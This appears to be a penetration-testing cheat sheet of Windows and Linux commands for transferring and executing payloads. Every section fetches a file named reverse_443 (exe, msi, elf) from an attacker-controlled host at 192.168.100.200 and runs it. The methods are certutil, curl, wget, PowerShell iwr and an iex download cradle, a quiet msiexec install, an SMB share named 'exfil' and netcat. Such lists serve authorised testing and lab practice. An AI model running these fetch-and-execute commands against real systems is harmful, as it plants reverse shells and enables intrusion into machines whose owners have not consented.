# Windows

```cmd
certutil -f -urlcache http://192.168.100.200/reverse_443.exe C:/ProgramData/reverse_443.exe
```

```cmd
curl http://192.168.100.200/reverse_443.exe > C:/ProgramData/reverse_443.exe
```

```cmd
wget http://192.168.100.200/reverse_443.exe -O C:/ProgramData/reverse_443.exe
```

```cmd
C:\ProgramData\reverse_443.exe
```

Recurse wget
```cmd
wget --recursive --no-parent http://192.168.100.200/folder
```
## Powershell

```powershell
iwr -uri http://192.168.100.200/reverse_443.msi -Outfile C:/ProgramData/reverse_443.msi
```

Executables
```powershell
C:\ProgramData\reverse_443.msi
```
or if installers
```powershell
msiexec.exe /i "C:\ProgramData\reverse_443.msi" /quiet
```

```bash
powershell -c "iex ((New-Object System.Net.WebClient).DownloadString('http://192.168.100.200/reverse_443.msi'))"
```

## SMB

```cmd
net use z: \\192.168.100.200\exfil kali /user:kali
```

```cmd
copy z:\reverse_443.exe C:\ProgramData\reverse_443.exe
```

```cmd
C:\ProgramData\reverse_443.exe
```
# Linux

```bash
curl http://192.168.100.200/reverse_443.elf > /tmp/reverse_443.elf
```

```bash
wget http://192.168.100.200/reverse_443.elf -O /tmp/reverse_443.elf
```

```bash
nc -l 80 < reverse_443.elf

nc 192.168.100.200 80 > /tmp/reverse_443.elf
```

```bash
chmod +x /tmp/reverse_443.elf
```

```bash
/tmp/reverse_443.elf
```